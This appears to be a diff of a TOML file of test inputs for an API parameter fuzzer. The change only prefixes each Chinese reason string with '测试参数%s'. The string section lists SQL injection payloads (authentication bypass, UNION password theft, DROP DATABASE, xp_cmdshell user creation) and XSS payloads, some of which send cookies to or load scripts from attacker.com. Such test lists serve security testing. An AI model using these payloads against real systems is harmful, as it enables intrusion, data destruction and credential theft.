@@ -2,121 +2,121 @@
 
 [number]
 values = [
-    {value = 1, reason = "测试最小整数值"},
-    {value = 100, reason = "测试普通整数值"},
-    {value = 10000, reason = "测试较大的整数值"},
-    {value = 2147483647, reason = "测试int32最大值"},
-    {value = -1, reason = "测试负整数值"},
-    {value = 0.1, reason = "测试浮动值"}
+    {value = 1, reason = "测试参数%s最小整数值"},
+    {value = 100, reason = "测试参数%s普通整数值"},
+    {value = 10000, reason = "测试参数%s较大的整数值"},
+    {value = 2147483647, reason = "测试参数%sint32最大值"},
+    {value = -1, reason = "测试参数%s负整数值"},
+    {value = 0.1, reason = "测试参数%s浮动值"}
 ]
 
 [string]
 values = [
-    {value = "a", reason = "测试普通字符串"},
-    {value = "test", reason = "测试普通字符串"},
-    {value = "longstringwithmorethan50characters", reason = "测试长字符串"},
+    {value = "a", reason = "测试参数%s普通字符串"},
+    {value = "test", reason = "测试参数%s普通字符串"},
+    {value = "longstringwithmorethan50characters", reason = "测试参数%s长字符串"},
 
     # SQL注入攻击示例
-    {value = "' OR 1=1 --", reason = "SQL注入：经典布尔注入攻击，绕过认证"},
-    {value = "' OR 'x'='x'", reason = "SQL注入：常见的布尔值注入"},
-    {value = "' DROP TABLE users; --", reason = "SQL注入：删除表的危险操作"},
-    {value = '" UNION SELECT NULL, username, password FROM users --', reason = "SQL注入：联合查询注入，窃取用户名密码"},
-    {value = "a' OR 1=1 --", reason = "SQL注入：通过注入特殊字符绕过认证"},
-    {value = "admin' --", reason = "SQL注入：通过注释符注入绕过认证"},
+    {value = "' OR 1=1 --", reason = "测试参数%sSQL注入：经典布尔注入攻击，绕过认证"},
+    {value = "' OR 'x'='x'", reason = "测试参数%sSQL注入：常见的布尔值注入"},
+    {value = "' DROP TABLE users; --", reason = "测试参数%sSQL注入：删除表的危险操作"},
+    {value = '" UNION SELECT NULL, username, password FROM users --', reason = "测试参数%sSQL注入：联合查询注入，窃取用户名密码"},
+    {value = "a' OR 1=1 --", reason = "测试参数%sSQL注入：通过注入特殊字符绕过认证"},
+    {value = "admin' --", reason = "测试参数%sSQL注入：通过注释符注入绕过认证"},
 
     # SQL盲注攻击
-    {value = "' AND 1=1 --", reason = "SQL盲注：常见的真/假盲注，永远为真"},
-    {value = "' AND 1=2 --", reason = "SQL盲注：常见的盲注，永远为假"},
-    {value = "' AND (SELECT COUNT(*) FROM users) > 0 --", reason = "SQL盲注：基于数量的盲注攻击"},
-    {value = "' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') = 65 --", reason = "SQL盲注：基于字符的盲注攻击（针对密码字符的逐个猜测）"},
+    {value = "' AND 1=1 --", reason = "测试参数%sSQL盲注：常见的真/假盲注，永远为真"},
+    {value = "' AND 1=2 --", reason = "测试参数%sSQL盲注：常见的盲注，永远为假"},
+    {value = "' AND (SELECT COUNT(*) FROM users) > 0 --", reason = "测试参数%sSQL盲注：基于数量的盲注攻击"},
+    {value = "' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') = 65 --", reason = "测试参数%sSQL盲注：基于字符的盲注攻击（针对密码字符的逐个猜测）"},
 
     # 时间盲注
-    {value = "' OR SLEEP(5) --", reason = "SQL时间盲注：利用时间延迟来判断注入是否成功"},
-    {value = "' AND SLEEP(5) --", reason = "SQL时间盲注：通过延迟时间来判断数据存在性"},
+    {value = "' OR SLEEP(5) --", reason = "测试参数%sSQL时间盲注：利用时间延迟来判断注入是否成功"},
+    {value = "' AND SLEEP(5) --", reason = "测试参数%sSQL时间盲注：通过延迟时间来判断数据存在性"},
 
     # 错误信息泄漏
-    {value = "' AND 1=1", reason = "SQL注入：通过SQL错误信息获取数据库结构"},
-    {value = "' AND 1=0", reason = "SQL注入：通过错误信息泄漏数据库结构"},
+    {value = "' AND 1=1", reason = "测试参数%sSQL注入：通过SQL错误信息获取数据库结构"},
+    {value = "' AND 1=0", reason = "测试参数%sSQL注入：通过错误信息泄漏数据库结构"},
 
     # 逻辑注入
-    {value = "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --", reason = "SQL注入：利用EXISTS关键字绕过认证"},
-    {value = "' UNION SELECT NULL, NULL, NULL --", reason = "SQL注入：联合查询注入，窥探数据库结构"},
+    {value = "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --", reason = "测试参数%sSQL注入：利用EXISTS关键字绕过认证"},
+    {value = "' UNION SELECT NULL, NULL, NULL --", reason = "测试参数%sSQL注入：联合查询注入，窥探数据库结构"},
 
     # 经典SQL注入与绕过
-    {value = "admin' #", reason = "SQL注入：用注释绕过认证"},
-    {value = "'; DROP DATABASE test; --", reason = "SQL注入：恶意删除数据库"},
-    {value = "'; EXEC xp_cmdshell('net user hacker password /add'); --", reason = "SQL注入：执行操作系统命令"},
+    {value = "admin' #", reason = "测试参数%sSQL注入：用注释绕过认证"},
+    {value = "'; DROP DATABASE test; --", reason = "测试参数%sSQL注入：恶意删除数据库"},
+    {value = "'; EXEC xp_cmdshell('net user hacker password /add'); --", reason = "测试参数%sSQL注入：执行操作系统命令"},
 
     # 反射型XSS（Reflected XSS）
-    {value = "<script>alert('XSS');</script>", reason = "反射型XSS：常见的XSS攻击载体1"},
-    {value = "<img src='x' onerror='alert(1)'>", reason = "反射型XSS：常见的XSS攻击载体2"},
-    {value = "<svg/onload=alert('XSS')>", reason = "反射型XSS：SVG元素XSS攻击"},
-    {value = "<iframe src='javascript:alert(1)'>", reason = "反射型XSS：通过iframe执行JS代码"},
-    {value = "<body onload='alert(1)'>", reason = "反射型XSS：通过body onload事件执行JS代码"},
-    {value = "<a href='javascript:alert(1)'>Click me</a>", reason = "反射型XSS：通过链接执行JS代码"},
-    {value = "<form action='javascript:alert(1)'></form>", reason = "反射型XSS：通过表单触发JS代码"},
+    {value = "<script>alert('XSS');</script>", reason = "测试参数%s反射型XSS：常见的XSS攻击载体1"},
+    {value = "<img src='x' onerror='alert(1)'>", reason = "测试参数%s反射型XSS：常见的XSS攻击载体2"},
+    {value = "<svg/onload=alert('XSS')>", reason = "测试参数%s反射型XSS：SVG元素XSS攻击"},
+    {value = "<iframe src='javascript:alert(1)'>", reason = "测试参数%s反射型XSS：通过iframe执行JS代码"},
+    {value = "<body onload='alert(1)'>", reason = "测试参数%s反射型XSS：通过body onload事件执行JS代码"},
+    {value = "<a href='javascript:alert(1)'>Click me</a>", reason = "测试参数%s反射型XSS：通过链接执行JS代码"},
+    {value = "<form action='javascript:alert(1)'></form>", reason = "测试参数%s反射型XSS：通过表单触发JS代码"},
 
     # 存储型XSS（Stored XSS）
-    {value = "<script>document.cookie='XSS' //</script>", reason = "存储型XSS：将XSS代码注入到cookie中"},
-    {value = "<img src='x' onerror='document.location=\"http://attacker.com?cookie=\" + document.cookie;'>", reason = "存储型XSS：窃取用户cookie并发送到攻击者服务器"},
-    {value = "<script src='http://attacker.com/xss.js'></script>", reason = "存储型XSS：加载恶意外部JS文件"},
-    {value = "<script>window.location='http://attacker.com?data='+document.location</script>", reason = "存储型XSS：发送页面内容到攻击者服务器"},
+    {value = "<script>document.cookie='XSS' //</script>", reason = "测试参数%s存储型XSS：将XSS代码注入到cookie中"},
+    {value = "<img src='x' onerror='document.location=\"http://attacker.com?cookie=\" + document.cookie;'>", reason = "测试参数%s存储型XSS：窃取用户cookie并发送到攻击者服务器"},
+    {value = "<script src='http://attacker.com/xss.js'></script>", reason = "测试参数%s存储型XSS：加载恶意外部JS文件"},
+    {value = "<script>window.location='http://attacker.com?data='+document.location</script>", reason = "测试参数%s存储型XSS：发送页面内容到攻击者服务器"},
 
     # DOM-based XSS
-    {value = "<script>document.getElementById('output').innerHTML = 'XSS';</script>", reason = "DOM-based XSS：通过DOM操作注入XSS"},
-    {value = "<script>window.location='javascript:alert(1)';</script>", reason = "DOM-based XSS：修改window.location触发JS执行"},
-    {value = "<a href='javascript:document.body.innerHTML=\"XSS\"'>Click</a>", reason = "DOM-based XSS：点击链接注入XSS"},
+    {value = "<script>document.getElementById('output').innerHTML = 'XSS';</script>", reason = "测试参数%sDOM-based XSS：通过DOM操作注入XSS"},
+    {value = "<script>window.location='javascript:alert(1)';</script>", reason = "测试参数%sDOM-based XSS：修改window.location触发JS执行"},
+    {value = "<a href='javascript:document.body.innerHTML=\"XSS\"'>Click</a>", reason = "测试参数%sDOM-based XSS：点击链接注入XSS"},
 
     # HTML属性内嵌XSS
-    {value = "<input type='text' value='XSS' onfocus='alert(1)'>", reason = "HTML属性XSS：通过input属性注入XSS"},
-    {value = "<textarea onfocus='alert(1)'>XSS</textarea>", reason = "HTML属性XSS：通过textarea属性注入XSS"},
+    {value = "<input type='text' value='XSS' onfocus='alert(1)'>", reason = "测试参数%sHTML属性XSS：通过input属性注入XSS"},
+    {value = "<textarea onfocus='alert(1)'>XSS</textarea>", reason = "测试参数%sHTML属性XSS：通过textarea属性注入XSS"},
 
     # 通过URL进行XSS攻击
-    {value = "<a href='http://victim.com?xss=<script>alert(1)</script>'>Click me</a>", reason = "URL注入XSS：通过URL传递恶意JS代码"},
-    {value = "<img src='http://victim.com?xss=<script>alert(1)</script>'>", reason = "URL注入XSS：通过img标签注入JS代码"},
+    {value = "<a href='http://victim.com?xss=<script>alert(1)</script>'>Click me</a>", reason = "测试参数%sURL注入XSS：通过URL传递恶意JS代码"},
+    {value = "<img src='http://victim.com?xss=<script>alert(1)</script>'>", reason = "测试参数%sURL注入XSS：通过img标签注入JS代码"},
 
     # 通过事件处理器执行XSS攻击
-    {value = "<button onclick='alert(1)'>Click me</button>", reason = "事件处理器XSS：通过按钮点击触发XSS"},
-    {value = "<a href='javascript:void(0)' onclick='alert(1)'>Click</a>", reason = "事件处理器XSS：通过事件触发JS代码"},
+    {value = "<button onclick='alert(1)'>Click me</button>", reason = "测试参数%s事件处理器XSS：通过按钮点击触发XSS"},
+    {value = "<a href='javascript:void(0)' onclick='alert(1)'>Click</a>", reason = "测试参数%s事件处理器XSS：通过事件触发JS代码"},
 
     # 常见的HTML实体编码绕过
-    {value = "&#60;script&#62;alert('XSS')&#60;/script&#62;", reason = "XSS编码绕过：通过HTML实体编码绕过过滤"},
-    {value = "&lt;script&gt;alert('XSS')&lt;/script&gt;", reason = "XSS编码绕过：通过HTML实体编码绕过过滤"},
+    {value = "&#60;script&#62;alert('XSS')&#60;/script&#62;", reason = "测试参数%sXSS编码绕过：通过HTML实体编码绕过过滤"},
+    {value = "&lt;script&gt;alert('XSS')&lt;/script&gt;", reason = "测试参数%sXSS编码绕过：通过HTML实体编码绕过过滤"},
 
     # 图片标签XSS攻击
-    {value = "<img src='x' onerror='alert(\"XSS\")'>", reason = "图片标签XSS：通过图片加载错误触发XSS"},
-    {value = "<img src='data:image/svg+xml,<svg/onload=alert(1)>' />", reason = "图片标签XSS：通过SVG图片触发XSS"},
+    {value = "<img src='x' onerror='alert(\"XSS\")'>", reason = "测试参数%s图片标签XSS：通过图片加载错误触发XSS"},
+    {value = "<img src='data:image/svg+xml,<svg/onload=alert(1)>' />", reason = "测试参数%s图片标签XSS：通过SVG图片触发XSS"},
 
     # JSON和JSONP中的XSS
-    {value = "<script>var jsonp = {callback: function() { alert(1); }};</script>", reason = "JSONP XSS：利用JSONP脚本注入XSS"},
-    {value = "<script>eval('alert(1)');</script>", reason = "JSONP XSS：通过eval绕过过滤器"},
+    {value = "<script>var jsonp = {callback: function() { alert(1); }};</script>", reason = "测试参数%sJSONP XSS：利用JSONP脚本注入XSS"},
+    {value = "<script>eval('alert(1)');</script>", reason = "测试参数%sJSONP XSS：通过eval绕过过滤器"},
 
     # Base64编码XSS
-    {value = "<script src='data:text/javascript;base64,ZXZhbCgibGV0J3MoMSkpOy'>", reason = "Base64 XSS：通过Base64编码注入恶意JS脚本"},
+    {value = "<script src='data:text/javascript;base64,ZXZhbCgibGV0J3MoMSkpOy'>", reason = "测试参数%sBase64 XSS：通过Base64编码注入恶意JS脚本"},
 
     # XSS绕过技巧
-    {value = "<img src='x' onerror='alert(&#34;XSS&#34;)' />", reason = "XSS绕过：使用字符编码绕过XSS过滤"},
-    {value = "<svg/onload=alert(1)>", reason = "XSS绕过：通过SVG标签触发XSS"},
-    {value = "<style>div{background:url(javascript:alert(1))}</style>", reason = "XSS绕过：通过CSS背景URL触发XSS"},
+    {value = "<img src='x' onerror='alert(&#34;XSS&#34;)' />", reason = "测试参数%sXSS绕过：使用字符编码绕过XSS过滤"},
+    {value = "<svg/onload=alert(1)>", reason = "测试参数%sXSS绕过：通过SVG标签触发XSS"},
+    {value = "<style>div{background:url(javascript:alert(1))}</style>", reason = "测试参数%sXSS绕过：通过CSS背景URL触发XSS"},
 
     # HTML5 新特性中的XSS
-    {value = "<audio onerror='alert(1)'></audio>", reason = "HTML5 XSS：通过音频元素注入XSS"},
-    {value = "<video onerror='alert(1)'></video>", reason = "HTML5 XSS：通过视频元素注入XSS"},
-    {value = "<progress onerror='alert(1)'></progress>", reason = "HTML5 XSS：通过进度条元素注入XSS"},
+    {value = "<audio onerror='alert(1)'></audio>", reason = "测试参数%sHTML5 XSS：通过音频元素注入XSS"},
+    {value = "<video onerror='alert(1)'></video>", reason = "测试参数%sHTML5 XSS：通过视频元素注入XSS"},
+    {value = "<progress onerror='alert(1)'></progress>", reason = "测试参数%sHTML5 XSS：通过进度条元素注入XSS"},
 
     # 反射型绕过
-    {value = "<script src='//attacker.com/xss.js'></script>", reason = "反射型绕过：通过外部JS文件进行注入"},
-    {value = "<script>document.write('<img src=\"//attacker.com/xss.jpg?cookie=' + document.cookie + '\" />');</script>", reason = "反射型绕过：通过document.write注入恶意代码"},
+    {value = "<script src='//attacker.com/xss.js'></script>", reason = "测试参数%s反射型绕过：通过外部JS文件进行注入"},
+    {value = "<script>document.write('<img src=\"//attacker.com/xss.jpg?cookie=' + document.cookie + '\" />');</script>", reason = "测试参数%s反射型绕过：通过document.write注入恶意代码"},
 
     # 通过HTTP请求头注入XSS
-    {value = "<script>alert('XSS')</script>", reason = "HTTP头XSS：通过HTTP头注入XSS攻击代码"},
-    {value = "Content-Type: text/html; charset=utf-8 <script>alert('XSS')</script>", reason = "HTTP头XSS：通过HTTP头注入HTML并触发XSS"}
+    {value = "<script>alert('XSS')</script>", reason = "测试参数%sHTTP头XSS：通过HTTP头注入XSS攻击代码"},
+    {value = "Content-Type: text/html; charset=utf-8 <script>alert('XSS')</script>", reason = "测试参数%sHTTP头XSS：通过HTTP头注入HTML并触发XSS"}
 ]
 
 [boolean]
 values = [
-    {value = true, reason = "测试布尔值true"},
-    {value = false, reason = "测试布尔值false"}
+    {value = true, reason = "测试参数%s布尔值true"},
+    {value = false, reason = "测试参数%s布尔值false"}
 ]
 
 [date]
@@ -127,18 +127,18 @@ values = [
 
 [time]
 values = [
-    {value = "00:00:00", reason = "测试标准的时间格式（HH:MM:SS）"},
-    {value = "23:59:59", reason = "测试标准的时间格式（HH:MM:SS）"}
+    {value = "00:00:00", reason = "测试参数%s标准的时间格式（HH:MM:SS）"},
+    {value = "23:59:59", reason = "测试参数%s标准的时间格式（HH:MM:SS）"}
 ]
 
 [object]
 values = [
-    {value = '{"name": "Alice", "age": 25}', reason = "测试JSON对象格式"},
-    {value = '{"username": "admin", "password": "12345"}', reason = "测试典型JSON结构"}
+    {value = '{"name": "Alice", "age": 25}', reason = "测试参数%sJSON对象格式"},
+    {value = '{"username": "admin", "password": "12345"}', reason = "测试参数%s典型JSON结构"}
 ]
 
 [array]
 values = [
-    {value = '[1, 2, 3]', reason = "测试数字数组"},
-    {value = '["apple", "banana"]', reason = "测试字符串数组"}
+    {value = '[1, 2, 3]', reason = "测试参数%s数字数组"},
+    {value = '["apple", "banana"]', reason = "测试参数%s字符串数组"}
 ]
